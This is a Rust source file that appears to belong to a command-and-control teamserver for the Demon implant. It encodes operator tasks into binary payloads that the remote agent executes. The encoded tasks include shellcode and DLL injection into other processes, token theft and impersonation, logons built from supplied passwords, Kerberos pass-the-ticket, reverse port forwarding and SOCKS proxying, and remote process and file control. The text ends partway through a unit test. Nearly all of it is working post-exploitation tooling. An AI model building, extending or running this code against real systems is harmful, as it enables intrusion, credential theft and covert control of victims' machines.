//! Task-encoding helpers: build agent jobs and encode Demon binary payloads.

use std::collections::BTreeMap;

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonInjectWay, DemonKerberosCommand,
    DemonProcessCommand, DemonSocketCommand, DemonTokenCommand,
};
use red_cell_common::operator::FlatInfo;
use serde_json::Value;
use time::OffsetDateTime;
use tracing::debug;
use uuid::Uuid;

use super::AgentCommandError;
use crate::Job;

// ── Job builders ────────────────────────────────────────────────────────────

#[cfg(test)]
pub(super) fn build_job(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Job, AgentCommandError> {
    let mut jobs = build_jobs(info, "")?;
    jobs.pop().ok_or(AgentCommandError::MissingField { field: "CommandID" })
}

pub(super) fn build_jobs(
    info: &red_cell_common::operator::AgentTaskInfo,
    operator: &str,
) -> Result<Vec<Job>, AgentCommandError> {
    let command_id = info.command_id.trim();
    let task_id_trimmed = info.task_id.trim();
    let request_id = u32::from_str_radix(task_id_trimmed, 16)
        .map_err(|_| AgentCommandError::InvalidTaskId { task_id: info.task_id.clone() })?;

    if is_teamserver_note_command(info) {
        return Err(AgentCommandError::MissingNote);
    }

    let command = if is_exit_command(info) {
        u32::from(DemonCommand::CommandExit)
    } else {
        command_id.parse::<u32>().map_err(|_| AgentCommandError::InvalidCommandId {
            command_id: command_id.to_owned(),
        })?
    };
    let created_at = OffsetDateTime::now_utc().unix_timestamp().to_string();

    if command == u32::from(DemonCommand::CommandFs)
        && matches!(filesystem_subcommand(info)?, DemonFilesystemCommand::Upload)
    {
        return build_upload_jobs(info, request_id, &created_at, operator);
    }

    let payload = task_payload(info, command)?;
    Ok(vec![Job {
        command,
        request_id,
        payload,
        command_line: info.command_line.clone(),
        task_id: info.task_id.clone(),
        created_at,
        operator: operator.to_owned(),
    }])
}

fn task_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
    command: u32,
) -> Result<Vec<u8>, AgentCommandError> {
    if is_exit_command(info) {
        return Ok(exit_method(info).to_be_bytes().to_vec());
    }

    if let Some(payload) = raw_task_payload(info)? {
        return Ok(payload);
    }

    if command == u32::from(DemonCommand::CommandProcList) {
        return Ok(encode_proc_list_payload(info));
    }

    if command == u32::from(DemonCommand::CommandFs) {
        return encode_fs_payload(info);
    }

    if command == u32::from(DemonCommand::CommandProc) {
        return encode_proc_command_payload(info);
    }

    if command == u32::from(DemonCommand::CommandInjectShellcode) {
        return encode_inject_shellcode_payload(info);
    }

    if command == u32::from(DemonCommand::CommandToken) {
        return encode_token_payload(info);
    }

    if command == u32::from(DemonCommand::CommandSocket) {
        return encode_socket_payload(info);
    }

    if command == u32::from(DemonCommand::CommandKerberos) {
        return encode_kerberos_payload(info);
    }

    if command == u32::from(DemonCommand::CommandInjectDll) {
        return encode_inject_dll_payload(info);
    }

    if command == u32::from(DemonCommand::CommandSpawnDll) {
        return encode_spawn_dll_payload(info);
    }

    // Allow known Demon commands to proceed with an empty payload (they may
    // legitimately require none), but reject unrecognised numeric command IDs
    // that also lack an explicit raw payload — those are protocol validation
    // errors that should not be silently enqueued.
    if DemonCommand::try_from(command).is_err() {
        return Err(AgentCommandError::UnsupportedCommandId { command_id: command });
    }

    Ok(Vec::new())
}

pub(super) use super::upload::build_upload_jobs;

// ── Note / exit helpers ─────────────────────────────────────────────────────

pub(super) fn note_from_task(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Option<String>, AgentCommandError> {
    if !is_teamserver_note_command(info) {
        return Ok(None);
    }

    let note = info
        .arguments
        .clone()
        .or_else(|| info.task_message.clone())
        .or_else(|| flat_info_string_from_extra(&info.extra, &["Note", "note"]))
        .map(|value| value.trim().to_owned())
        .filter(|value| !value.is_empty())
        .ok_or(AgentCommandError::MissingNote)?;

    if note.len() > red_cell_common::operator::MAX_AGENT_NOTE_LEN {
        return Err(AgentCommandError::NoteTooLong {
            length: note.len(),
            limit: red_cell_common::operator::MAX_AGENT_NOTE_LEN,
        });
    }

    Ok(Some(note))
}

pub(super) fn is_teamserver_note_command(info: &red_cell_common::operator::AgentTaskInfo) -> bool {
    info.command_id.eq_ignore_ascii_case("Teamserver")
        && info.command.as_deref().is_some_and(|command| {
            command.eq_ignore_ascii_case("note") || command.eq_ignore_ascii_case("agent::note")
        })
}

pub(super) fn is_exit_command(info: &red_cell_common::operator::AgentTaskInfo) -> bool {
    info.command_id.trim() == u32::from(DemonCommand::CommandExit).to_string()
        || info.command.as_deref().is_some_and(|command| {
            command.eq_ignore_ascii_case("kill") || command.eq_ignore_ascii_case("agent::kill")
        })
}

fn exit_method(info: &red_cell_common::operator::AgentTaskInfo) -> u32 {
    match info.arguments.as_deref() {
        Some(argument) if argument.eq_ignore_ascii_case("process") => 2,
        _ => 1,
    }
}

// ── Agent ID parsing ────────────────────────────────────────────────────────

pub(super) fn parse_agent_id(agent_id: &str) -> Result<u32, AgentCommandError> {
    let trimmed = agent_id.trim();
    if trimmed.is_empty() {
        return Err(AgentCommandError::MissingAgentId);
    }

    u32::from_str_radix(trimmed.trim_start_matches("0x").trim_start_matches("0X"), 16)
        .map_err(|_| AgentCommandError::InvalidAgentId { agent_id: trimmed.to_owned() })
}

// ── Field extraction helpers ────────────────────────────────────────────────

pub(super) fn flat_info_string(info: &FlatInfo, keys: &[&str]) -> Option<String> {
    flat_info_string_from_extra(&info.fields, keys)
}

pub(super) fn flat_info_string_from_extra(
    extra: &BTreeMap<String, Value>,
    keys: &[&str],
) -> Option<String> {
    keys.iter().find_map(|key| extra.get(*key)).and_then(Value::as_str).map(ToOwned::to_owned)
}

fn raw_task_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Option<Vec<u8>>, AgentCommandError> {
    if let Some(payload) = flat_info_string_from_extra(&info.extra, &["PayloadBase64"]) {
        let decoded = BASE64_STANDARD.decode(payload.trim()).map_err(|error| {
            AgentCommandError::InvalidBase64Field {
                field: "PayloadBase64".to_owned(),
                message: error.to_string(),
            }
        })?;
        return Ok(Some(decoded));
    }

    Ok(flat_info_string_from_extra(&info.extra, &["Payload"]).map(|payload| payload.into_bytes()))
}

pub(super) fn required_string(
    info: &red_cell_common::operator::AgentTaskInfo,
    keys: &[&str],
    field: &'static str,
) -> Result<String, AgentCommandError> {
    string_field(info, keys).ok_or(AgentCommandError::MissingField { field })
}

fn required_u32(
    info: &red_cell_common::operator::AgentTaskInfo,
    keys: &[&str],
    field: &'static str,
) -> Result<u32, AgentCommandError> {
    let value = required_string(info, keys, field)?;
    parse_u32_field(field, &value)
}

fn optional_u32(info: &red_cell_common::operator::AgentTaskInfo, keys: &[&str]) -> Option<u32> {
    string_field(info, keys).and_then(|value| {
        let trimmed = value.trim();
        match trimmed.parse::<u32>() {
            Ok(n) => Some(n),
            Err(err) => {
                debug!(
                    field = ?keys,
                    value = trimmed,
                    %err,
                    "optional_u32: ignoring unparseable value"
                );
                None
            }
        }
    })
}

fn optional_base64(
    info: &red_cell_common::operator::AgentTaskInfo,
    keys: &[&str],
) -> Result<Option<Vec<u8>>, AgentCommandError> {
    string_field(info, keys).map(|value| decode_base64_field(keys[0], &value)).transpose()
}

fn decode_base64_required(
    info: &red_cell_common::operator::AgentTaskInfo,
    keys: &[&str],
    field: &'static str,
) -> Result<Vec<u8>, AgentCommandError> {
    let value = required_string(info, keys, field)?;
    decode_base64_field(field, &value)
}

fn decode_base64_field(field: &str, value: &str) -> Result<Vec<u8>, AgentCommandError> {
    BASE64_STANDARD.decode(value.trim()).map_err(|error| AgentCommandError::InvalidBase64Field {
        field: field.to_owned(),
        message: error.to_string(),
    })
}

fn string_field(info: &red_cell_common::operator::AgentTaskInfo, keys: &[&str]) -> Option<String> {
    for key in keys {
        match *key {
            "Arguments" => {
                if let Some(value) = info.arguments.clone() {
                    return Some(value);
                }
            }
            "SubCommand" => {
                if let Some(value) = info.sub_command.clone() {
                    return Some(value);
                }
            }
            _ => {}
        }

        if let Some(value) = info.extra.get(*key) {
            match value {
                Value::String(text) => return Some(text.clone()),
                Value::Bool(flag) => return Some(flag.to_string()),
                Value::Number(number) => return Some(number.to_string()),
                _ => {}
            }
        }
    }

    None
}

fn extra_bool(info: &red_cell_common::operator::AgentTaskInfo, keys: &[&str]) -> Option<bool> {
    for key in keys {
        let Some(value) = info.extra.get(*key) else {
            continue;
        };
        match value {
            Value::Bool(flag) => return Some(*flag),
            Value::String(text) => {
                if let Ok(flag) = parse_bool_field(key, text) {
                    return Some(flag);
                }
            }
            Value::Number(number) => return Some(number.as_u64().unwrap_or_default() != 0),
            _ => {}
        }
    }

    None
}

// ── Payload encoders ────────────────────────────────────────────────────────

fn encode_proc_list_payload(info: &red_cell_common::operator::AgentTaskInfo) -> Vec<u8> {
    let from_process_manager = extra_bool(info, &["FromProcessManager"]).unwrap_or(false);
    u32::from(from_process_manager).to_le_bytes().to_vec()
}

fn encode_fs_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = filesystem_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, u32::from(subcommand));

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts = args.splitn(8, ';').collect::<Vec<_>>();
            if parts.len() != 8 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            write_u32(&mut payload, 0);
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[0]))?;
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[1]", parts[1])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[2]", parts[2])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[3]", parts[3])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[4]", parts[4])?));
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[5]))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[6]))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[7]))?;
        }
        DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
            let path = decode_base64_required(info, &["Arguments"], "Arguments")?;
            let path = String::from_utf8_lossy(&path).into_owned();
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path))?;
        }
        DemonFilesystemCommand::Upload => {
            let remote_path = super::upload::upload_remote_path(info)?;
            let memfile_id = required_u32(info, &["MemFileId"], "MemFileId")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path))?;
            write_u32(&mut payload, memfile_id);
        }
        DemonFilesystemCommand::Cd
        | DemonFilesystemCommand::Remove
        | DemonFilesystemCommand::Mkdir => {
            let path = required_string(info, &["Arguments"], "Arguments")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path))?;
        }
        DemonFilesystemCommand::Copy | DemonFilesystemCommand::Move => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts = args.splitn(2, ';').collect::<Vec<_>>();
            if parts.len() != 2 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let from = String::from_utf8_lossy(&decode_base64_field("Arguments[0]", parts[0])?)
                .into_owned();
            let to = String::from_utf8_lossy(&decode_base64_field("Arguments[1]", parts[1])?)
                .into_owned();
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&from))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&to))?;
        }
        DemonFilesystemCommand::GetPwd => {}
    }

    Ok(payload)
}

fn encode_proc_command_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = proc_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, subcommand.into());

    match subcommand {
        DemonProcessCommand::Kill => {
            let pid = required_u32(info, &["Args", "Arguments"], "Args")?;
            write_u32(&mut payload, pid);
        }
        DemonProcessCommand::Create => {
            let arguments = required_string(info, &["Args", "Arguments"], "Args")?;
            let parts = arguments.splitn(5, ';').collect::<Vec<_>>();
            if parts.len() != 5 {
                return Err(AgentCommandError::InvalidProcessCreateArguments);
            }

            let state = parse_u32_field("Args[0]", parts[0])?;
            let verbose = parse_bool_field("Args[1]", parts[1])?;
            let piped = parse_bool_field("Args[2]", parts[2])?;
            let program = parts[3];
            let process_args = decode_base64_field("Args[4]", parts[4])?;
            let process_args = String::from_utf8_lossy(&process_args).into_owned();

            write_u32(&mut payload, state);
            write_len_prefixed_bytes(&mut payload, &encode_utf16(program))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&process_args))?;
            write_u32(&mut payload, u32::from(piped));
            write_u32(&mut payload, u32::from(verbose));
        }
        DemonProcessCommand::Modules => {
            let pid = required_u32(info, &["Args", "Arguments"], "Args")?;
            write_u32(&mut payload, pid);
        }
        DemonProcessCommand::Grep => {
            let pattern = required_string(info, &["Args", "Arguments"], "Args")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&pattern))?;
        }
        DemonProcessCommand::Memory => {
            let arguments = required_string(info, &["Args", "Arguments"], "Args")?;
            let parts = arguments.split_whitespace().collect::<Vec<_>>();
            if parts.len() < 2 {
                return Err(AgentCommandError::MissingField { field: "Args" });
            }
            let pid = parse_u32_field("PID", parts[0])?;
            let protection = parse_memory_protection(parts[1])?;
            write_u32(&mut payload, pid);
            write_u32(&mut payload, protection);
        }
    }

    Ok(payload)
}

fn encode_inject_shellcode_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let way = required_string(info, &["Way"], "Way")?;
    let technique = required_string(info, &["Technique"], "Technique")?;
    let arch = required_string(info, &["Arch"], "Arch")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Argument", "Arguments"])?.unwrap_or_default();

    let mut payload = Vec::new();
    match parse_injection_way(&way)? {
        DemonInjectWay::Inject => {
            write_u32(&mut payload, u32::from(DemonInjectWay::Inject));
            write_u32(&mut payload, parse_injection_technique(&technique)?);
            write_u32(&mut payload, arch_to_flag(&arch)?);
            write_len_prefixed_bytes(&mut payload, &binary)?;
            write_len_prefixed_bytes(&mut payload, &arguments)?;
            let pid = required_u32(info, &["PID"], "PID")?;
            write_u32(&mut payload, pid);
        }
        DemonInjectWay::Spawn => {
            write_u32(&mut payload, u32::from(DemonInjectWay::Spawn));
            write_u32(&mut payload, parse_injection_technique(&technique)?);
            write_u32(&mut payload, arch_to_flag(&arch)?);
            write_len_prefixed_bytes(&mut payload, &binary)?;
            write_len_prefixed_bytes(&mut payload, &arguments)?;
        }
        other => {
            return Err(AgentCommandError::UnsupportedInjectionWay {
                way: u32::from(other).to_string(),
            });
        }
    }

    Ok(payload)
}

fn encode_token_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = token_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, subcommand.into());

    match subcommand {
        DemonTokenCommand::Impersonate => {
            let token_id = required_u32(info, &["Arguments"], "Arguments")?;
            write_u32(&mut payload, token_id);
        }
        DemonTokenCommand::Steal => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts: Vec<&str> = args.split(';').collect();
            if parts.len() < 2 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let pid = parse_u32_field("PID", parts[0])?;
            let handle = parse_hex_u32(parts[1])?;
            write_u32(&mut payload, pid);
            write_u32(&mut payload, handle);
        }
        DemonTokenCommand::List
        | DemonTokenCommand::GetUid
        | DemonTokenCommand::Revert
        | DemonTokenCommand::Clear
        | DemonTokenCommand::FindTokens => {}
        DemonTokenCommand::PrivsGetOrList => {
            let sub_from_extra = flat_info_string_from_extra(&info.extra, &["SubCommand"]);
            let sub = info.sub_command.as_deref().or(sub_from_extra.as_deref()).unwrap_or("");
            if sub.eq_ignore_ascii_case("privs-list") || sub == "4" {
                write_u32(&mut payload, 1);
            } else {
                write_u32(&mut payload, 0);
                let priv_name = required_string(info, &["Arguments"], "Arguments")?;
                write_len_prefixed_bytes(&mut payload, priv_name.as_bytes())?;
            }
        }
        DemonTokenCommand::Make => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts: Vec<&str> = args.split(';').collect();
            if parts.len() < 4 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let domain = decode_base64_field("Domain", parts[0])?;
            let user = decode_base64_field("User", parts[1])?;
            let password = decode_base64_field("Password", parts[2])?;
            let logon_type = parse_u32_field("LogonType", parts[3])?;
            write_len_prefixed_bytes(
                &mut payload,
                &encode_utf16(&String::from_utf8_lossy(&domain)),
            )?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&String::from_utf8_lossy(&user)))?;
            write_len_prefixed_bytes(
                &mut payload,
                &encode_utf16(&String::from_utf8_lossy(&password)),
            )?;
            write_u32(&mut payload, logon_type);
        }
        DemonTokenCommand::Remove => {
            let token_id = required_u32(info, &["Arguments"], "Arguments")?;
            write_u32(&mut payload, token_id);
        }
    }

    Ok(payload)
}

fn encode_socket_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let command = socket_command(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, command.0);

    match command.1.as_str() {
        "rportfwd add" => {
            let params = required_string(info, &["Params", "Arguments"], "Params")?;
            let parts = params.split(';').map(str::trim).collect::<Vec<_>>();
            if parts.len() != 4 {
                return Err(AgentCommandError::MissingField { field: "Params" });
            }
            write_u32(&mut payload, ipv4_to_u32(parts[0])?);
            write_u32(&mut payload, parse_u32_field("Params[1]", parts[1])?);
            write_u32(&mut payload, ipv4_to_u32(parts[2])?);
            write_u32(&mut payload, parse_u32_field("Params[3]", parts[3])?);
        }
        "rportfwd remove" => {
            let socket_id =
                parse_hex_u32(&required_string(info, &["Params", "Arguments"], "Params")?)?;
            write_u32(&mut payload, socket_id);
        }
        "rportfwd list" | "rportfwd clear" => {}
        _ => return Err(AgentCommandError::UnsupportedSocketSubcommand { subcommand: command.1 }),
    }

    Ok(payload)
}

fn encode_kerberos_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = kerberos_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, u32::from(subcommand));

    match subcommand {
        DemonKerberosCommand::Luid => {}
        DemonKerberosCommand::Klist => {
            let arg1 = required_string(info, &["Argument1", "Arguments"], "Argument1")?;
            if arg1.eq_ignore_ascii_case("/all") {
                write_u32(&mut payload, 0);
            } else if arg1.eq_ignore_ascii_case("/luid") {
                write_u32(&mut payload, 1);
                let luid = parse_hex_u32(&required_string(info, &["Argument2"], "Argument2")?)?;
                write_u32(&mut payload, luid);
            } else {
                return Err(AgentCommandError::UnsupportedKerberosSubcommand { subcommand: arg1 });
            }
        }
        DemonKerberosCommand::Purge => {
            let luid =
                parse_hex_u32(&required_string(info, &["Argument", "Arguments"], "Argument")?)?;
            write_u32(&mut payload, luid);
        }
        DemonKerberosCommand::Ptt => {
            let ticket = decode_base64_required(info, &["Ticket"], "Ticket")?;
            let luid = parse_hex_u32(&required_string(info, &["Luid"], "Luid")?)?;
            write_len_prefixed_bytes(&mut payload, &ticket)?;
            write_u32(&mut payload, luid);
        }
    }

    Ok(payload)
}

fn encode_inject_dll_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let technique = optional_u32(info, &["Technique"]).unwrap_or(0);
    let pid = required_u32(info, &["PID"], "PID")?;
    let loader = decode_base64_required(info, &["DllLoader", "Loader"], "DllLoader")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();

    let mut payload = Vec::new();
    write_u32(&mut payload, technique);
    write_u32(&mut payload, pid);
    write_len_prefixed_bytes(&mut payload, &loader)?;
    write_len_prefixed_bytes(&mut payload, &binary)?;
    write_len_prefixed_bytes(&mut payload, &arguments)?;
    Ok(payload)
}

fn encode_spawn_dll_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let loader = decode_base64_required(info, &["DllLoader", "Loader"], "DllLoader")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();

    let mut payload = Vec::new();
    write_len_prefixed_bytes(&mut payload, &loader)?;
    write_len_prefixed_bytes(&mut payload, &binary)?;
    write_len_prefixed_bytes(&mut payload, &arguments)?;
    Ok(payload)
}

// ── Subcommand parsers ──────────────────────────────────────────────────────

fn proc_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonProcessCommand, AgentCommandError> {
    let raw = flat_info_string_from_extra(&info.extra, &["ProcCommand"])
        .or_else(|| info.sub_command.clone())
        .ok_or(AgentCommandError::MissingField { field: "ProcCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "2" | "modules" => Ok(DemonProcessCommand::Modules),
        "3" | "grep" => Ok(DemonProcessCommand::Grep),
        "4" | "create" => Ok(DemonProcessCommand::Create),
        "6" | "memory" => Ok(DemonProcessCommand::Memory),
        "7" | "kill" => Ok(DemonProcessCommand::Kill),
        _ => Err(AgentCommandError::UnsupportedProcessSubcommand { subcommand: raw }),
    }
}

pub(super) fn filesystem_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonFilesystemCommand, AgentCommandError> {
    let raw = info
        .sub_command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["SubCommand"]))
        .ok_or(AgentCommandError::MissingField { field: "SubCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "1" | "dir" | "ls" => Ok(DemonFilesystemCommand::Dir),
        "2" | "download" => Ok(DemonFilesystemCommand::Download),
        "3" | "upload" => Ok(DemonFilesystemCommand::Upload),
        "4" | "cd" => Ok(DemonFilesystemCommand::Cd),
        "5" | "remove" | "rm" | "del" => Ok(DemonFilesystemCommand::Remove),
        "6" | "mkdir" => Ok(DemonFilesystemCommand::Mkdir),
        "7" | "cp" | "copy" => Ok(DemonFilesystemCommand::Copy),
        "8" | "mv" | "move" => Ok(DemonFilesystemCommand::Move),
        "9" | "pwd" => Ok(DemonFilesystemCommand::GetPwd),
        "10" | "cat" | "type" => Ok(DemonFilesystemCommand::Cat),
        _ => Err(AgentCommandError::UnsupportedFilesystemSubcommand { subcommand: raw }),
    }
}

fn token_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonTokenCommand, AgentCommandError> {
    let raw = info
        .sub_command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["SubCommand"]))
        .ok_or(AgentCommandError::MissingField { field: "SubCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "1" | "impersonate" => Ok(DemonTokenCommand::Impersonate),
        "2" | "steal" => Ok(DemonTokenCommand::Steal),
        "3" | "list" => Ok(DemonTokenCommand::List),
        "4" | "privs-list" | "privs-get" | "privs" => Ok(DemonTokenCommand::PrivsGetOrList),
        "5" | "make" => Ok(DemonTokenCommand::Make),
        "6" | "getuid" => Ok(DemonTokenCommand::GetUid),
        "7" | "revert" => Ok(DemonTokenCommand::Revert),
        "8" | "remove" => Ok(DemonTokenCommand::Remove),
        "9" | "clear" => Ok(DemonTokenCommand::Clear),
        "10" | "find" => Ok(DemonTokenCommand::FindTokens),
        _ => Err(AgentCommandError::UnsupportedTokenSubcommand { subcommand: raw }),
    }
}

pub(super) fn socket_command(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<(u32, String), AgentCommandError> {
    let raw = info
        .command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["Command"]))
        .ok_or(AgentCommandError::MissingField { field: "Command" })?;
    let normalized = raw.trim().to_ascii_lowercase();
    let command = match normalized.as_str() {
        "rportfwd add" => u32::from(DemonSocketCommand::ReversePortForwardAdd),
        "rportfwd list" => u32::from(DemonSocketCommand::ReversePortForwardList),
        "rportfwd remove" => u32::from(DemonSocketCommand::ReversePortForwardRemove),
        "rportfwd clear" => u32::from(DemonSocketCommand::ReversePortForwardClear),
        "socks add" | "socks list" | "socks kill" | "socks clear" => {
            u32::from(DemonSocketCommand::SocksProxyAdd)
        }
        _ => {
            return Err(AgentCommandError::UnsupportedSocketSubcommand { subcommand: raw });
        }
    };
    Ok((command, normalized))
}

fn kerberos_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonKerberosCommand, AgentCommandError> {
    let raw = info
        .command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["Command"]))
        .ok_or(AgentCommandError::MissingField { field: "Command" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "luid" => Ok(DemonKerberosCommand::Luid),
        "klist" => Ok(DemonKerberosCommand::Klist),
        "purge" => Ok(DemonKerberosCommand::Purge),
        "ptt" => Ok(DemonKerberosCommand::Ptt),
        _ => Err(AgentCommandError::UnsupportedKerberosSubcommand { subcommand: raw }),
    }
}

// ── Parse helpers ───────────────────────────────────────────────────────────

fn parse_injection_way(value: &str) -> Result<DemonInjectWay, AgentCommandError> {
    match value.trim().to_ascii_lowercase().as_str() {
        "inject" => Ok(DemonInjectWay::Inject),
        "spawn" => Ok(DemonInjectWay::Spawn),
        _ => Err(AgentCommandError::UnsupportedInjectionWay { way: value.to_owned() }),
    }
}

fn parse_memory_protection(value: &str) -> Result<u32, AgentCommandError> {
    match value.to_ascii_uppercase().as_str() {
        "PAGE_NOACCESS" => Ok(0x01),
        "PAGE_READONLY" => Ok(0x02),
        "PAGE_READWRITE" => Ok(0x04),
        "PAGE_WRITECOPY" => Ok(0x08),
        "PAGE_EXECUTE" => Ok(0x10),
        "PAGE_EXECUTE_READ" => Ok(0x20),
        "PAGE_EXECUTE_READWRITE" => Ok(0x40),
        "PAGE_EXECUTE_WRITECOPY" => Ok(0x80),
        "PAGE_GUARD" => Ok(0x100),
        _ => Err(AgentCommandError::InvalidNumericField {
            field: "MemoryProtection".to_owned(),
            value: value.to_owned(),
        }),
    }
}

fn parse_injection_technique(value: &str) -> Result<u32, AgentCommandError> {
    match value.trim().to_ascii_lowercase().as_str() {
        "default" => Ok(0),
        "createremotethread" => Ok(1),
        "ntcreatethreadex" => Ok(2),
        "ntqueueapcthread" => Ok(3),
        _ => Err(AgentCommandError::UnsupportedInjectionTechnique { technique: value.to_owned() }),
    }
}

fn arch_to_flag(value: &str) -> Result<u32, AgentCommandError> {
    match value.trim().to_ascii_lowercase().as_str() {
        "x86" => Ok(0),
        "x64" => Ok(1),
        _ => Err(AgentCommandError::UnsupportedArchitecture { arch: value.to_owned() }),
    }
}

fn parse_bool_field(field: &str, value: &str) -> Result<bool, AgentCommandError> {
    match value.trim().to_ascii_lowercase().as_str() {
        "1" | "true" => Ok(true),
        "0" | "false" => Ok(false),
        _ => Err(AgentCommandError::InvalidBooleanField {
            field: field.to_owned(),
            value: value.to_owned(),
        }),
    }
}

fn parse_u32_field(field: &str, value: &str) -> Result<u32, AgentCommandError> {
    value.trim().parse::<u32>().map_err(|_| AgentCommandError::InvalidNumericField {
        field: field.to_owned(),
        value: value.to_owned(),
    })
}

fn parse_hex_u32(value: &str) -> Result<u32, AgentCommandError> {
    let trimmed = value.trim();
    let trimmed =
        trimmed.strip_prefix("0x").or_else(|| trimmed.strip_prefix("0X")).unwrap_or(trimmed);
    u32::from_str_radix(trimmed, 16).map_err(|_| AgentCommandError::InvalidNumericField {
        field: "hex".to_owned(),
        value: value.to_owned(),
    })
}

fn ipv4_to_u32(value: &str) -> Result<u32, AgentCommandError> {
    let address = value.trim().parse::<std::net::Ipv4Addr>().map_err(|_| {
        AgentCommandError::InvalidNumericField { field: "ip".to_owned(), value: value.to_owned() }
    })?;
    Ok(u32::from_le_bytes(address.octets()))
}

// ── Binary writing helpers ──────────────────────────────────────────────────

pub(super) fn write_u32(buf: &mut Vec<u8>, value: u32) {
    buf.extend_from_slice(&value.to_le_bytes());
}

pub(super) fn write_u64(buf: &mut Vec<u8>, value: u64) {
    buf.extend_from_slice(&value.to_le_bytes());
}

pub(super) fn write_len_prefixed_bytes(
    buf: &mut Vec<u8>,
    value: &[u8],
) -> Result<(), crate::TeamserverError> {
    let len = u32::try_from(value.len())
        .map_err(|_| crate::TeamserverError::PayloadTooLarge { length: value.len() })?;
    write_u32(buf, len);
    buf.extend_from_slice(value);
    Ok(())
}

pub(super) fn random_u32() -> u32 {
    let bytes = *Uuid::new_v4().as_bytes();
    u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]])
}

pub(super) fn encode_utf16(value: &str) -> Vec<u8> {
    let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
    encoded.extend_from_slice(&[0, 0]);
    encoded
}

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::operator::{AgentTaskInfo, MAX_AGENT_NOTE_LEN};

    fn note_task(note: String) -> AgentTaskInfo {
        AgentTaskInfo {
            command_id: "Teamserver".to_owned(),
            command: Some("agent::note".to_owned()),
            arguments: Some(note),
            ..AgentTaskInfo::default()
        }
    }

    #[test]
    fn note_from_task_accepts_note_at_limit() {
        let note = "x".repeat(MAX_AGENT_NOTE_LEN);
        let info = note_task(note.clone());

        let extracted = note_from_task(&info).expect("note at limit should be accepted");
        assert_eq!(extracted, Some(note));
    }

    #[test]
    fn note_from_task_rejects_oversized_note() {
        let note = "x".repeat(MAX_AGENT_NOTE_LEN + 1);
        let info = note_task(note);

        let err = note_from_task(&info).expect_err("oversized note should be rejected");
        match err {
